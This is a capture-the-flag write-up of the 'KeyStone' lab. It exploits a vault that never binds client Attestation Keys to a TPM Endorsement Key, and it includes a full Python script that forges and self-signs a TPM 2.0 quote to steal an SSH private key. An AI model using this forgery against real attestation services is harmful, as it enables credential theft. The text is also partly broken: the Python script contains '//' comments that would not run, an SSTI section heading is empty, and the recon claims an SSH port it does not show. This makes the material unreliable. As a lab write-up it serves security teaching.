KeyStone-User

Exploiting missing TPM 2.0 Endorsement Key (EK) binding verification to forge self-signed TPMS_ATTEST quotes and retrieve administrative secrets.

Reshma Al (Coldcoffee) · 02 Nov 2026 · 4 min read · nmap, curl, nc, Python 3 (cryptography), bash
Captured Flag isfcr{tr0st_but_v3rify_the_endors3ment}

1. Challenge Overview & Architecture

The KeyStone system is designed as a hardware-rooted cryptographic secret vault simulating confidential computing environments. The application advertises that it only releases operational tokens to attested clients verified by a hardware or virtual TPM 2.0 engine.

Key services identified:

  • Nginx Reverse Proxy (Port 80): Serves the Keystone Attestation Portal.
  • Vault Microservice (127.0.0.1:9000): Written in Go (/opt/vault/main.go), enforcing attestation logic and quote validation.
  • Software TPM Emulator (127.0.0.1:2321): Running swtpm on the loopback adapter with an Attestation Key (AK) at handle 0x81000001.

2. Reconnaissance & Initial Foothold

Port scanning revealed standard web and SSH ports:

$ sudo nmap -p- --min-rate 5000 -n -Pn 10.48.167.146
PORT   STATE SERVICE

80/tcp open  http

Browsing the portal presented documentation links at /review?doc=:

  • /review?doc=welcome: Details the attestation lifecycle:
    1. POST /attest with an Attestation Key (AK) public key.
    2. The vault issues a session nonce and expected PCR digest.
    3. Client supplies a signed TPM 2.0 quote to POST /verify.
    4. Upon verification, the vault returns an access token to redeem at GET /secret?token=.
  • /review?doc=changelog: Explicitly confesses bug VAULT-114: "Vault is treating the client-supplied AK as trusted after signature verification only -- AK is never bound to a real hardware/software Endorsement Key (missing credential activation). Also: a Jinja2 render was added to /review, risk accepted."

Exploiting SSTI for Local Shell Access

3. Vulnerability Analysis: TPM Quote Forgery (VAULT-114)

Reviewing the Go vault implementation in /opt/vault/main.go verified the exact flaw:

// /opt/vault/main.go
func (v *Vault) VerifyQuote(req VerifyRequest) error {
    // 1. Signature check against the public key submitted in /attest
    // 2. Checks magic bytes: TPMS_ATTEST magic == 0xFF544347
    // 3. Checks type: 0x8018 (TPM_ST_ATTEST_QUOTE)
    // 4. Checks extraData == session.nonce
    // 5. Checks pcrDigest == session.expectedDigest
}

The Fatal Flaw

In authentic TPM attestation, a client cannot simply submit an arbitrary RSA key and sign a quote with it. The server must verify that the Attestation Key was generated by a certified TPM chip by performing TPM Credential Activation (TPM2_MakeCredential / TPM2_ActivateCredential) against the manufacturer-signed Endorsement Key (EK).

Because KeyStone omitted credential activation:

  1. We can generate a completely standard RSA-2048 keypair locally using Python.
  2. Register the public key at /attest. The vault provides the session nonce and the exact required pcrDigest.
  3. We synthesize the binary TPMS_ATTEST structure manually.
  4. We sign the structure with our own private key using standard PKCS#1 v1.5 with SHA-256!

Binary Layout of TPMS_ATTEST

Parsing /opt/vault/main.go revealed the required struct packing:

  • magic: 0xFF544347 (4 bytes, Big-Endian)
  • type: 0x8018 (2 bytes, Big-Endian)
  • qualifiedSigner: 2-byte length + empty bytes (unchecked by vault)
  • extraData: 2-byte length + session nonce
  • clockInfo: 17 dummy bytes (unchecked)
  • firmwareVersion: 8 dummy bytes (unchecked)
  • pcrSelect.count: 0x00000000 (4 bytes) -> skip PCR selection checks
  • pcrDigest: 2-byte length + expected PCR digest from vault

4. Exploit Implementation

We deployed forge.py on the machine:

import json, base64, struct, urllib.request
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

VAULT = "http://127.0.0.1:9000"

# Step 1: Generate rogue RSA Keypair
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub_pem = key.public_key().public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode()

def post_json(path, data):
    req = urllib.request.Request(VAULT + path, data=json.dumps(data).encode(),
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req) as r:
        return json.loads(r.read())

# Step 2: Register Attestation Key
init = post_json("/attest", {"ak_pub_pem": pub_pem})
session_id = init["session"]
nonce = bytes.fromhex(init["nonce"])
expected_digest = bytes.fromhex(init["expected_digest"])

# Step 3: Forge TPMS_ATTEST Binary Blob
def p16(b): return struct.pack(">H", len(b)) + b

quote_msg = struct.pack(">I", 0xFF544347)  # TPM_GENERATED_VALUE
quote_msg += struct.pack(">H", 0x8018)     # TPM_ST_ATTEST_QUOTE
quote_msg += p16(b"")                      // empty qualifiedSigner
quote_msg += p16(nonce)                    // extraData matches session nonce
quote_msg += b"\x00" * 17                 // dummy TPMS_CLOCK_INFO
quote_msg += b"\x00" * 8                  // dummy firmwareVersion
quote_msg += struct.pack(">I", 0)          // pcrSelect.count = 0
quote_msg += p16(expected_digest)          // matches vault's expected PCR digest

# Step 4: Self-Sign the Forged Quote
sig = key.sign(quote_msg, padding.PKCS1v15(), hashes.SHA256())

# Step 5: Verify Quote & Pull Vault Secret
res = post_json("/verify", {
    "session": session_id,
    "quote_msg": base64.b64encode(quote_msg).decode(),
    "quote_sig": base64.b64encode(sig).decode()
})

token = res["token"]
secret_data = json.loads(urllib.request.urlopen(VAULT + f"/secret?token={token}").read())
print("Sealed Secret Retrieved:")
print(secret_data["ssh_private_key"])

5. User Flag Capture

Executing python3 forge.py successfully deceived the vault, returning an unencrypted OpenSSH private key for user tpm-admin.
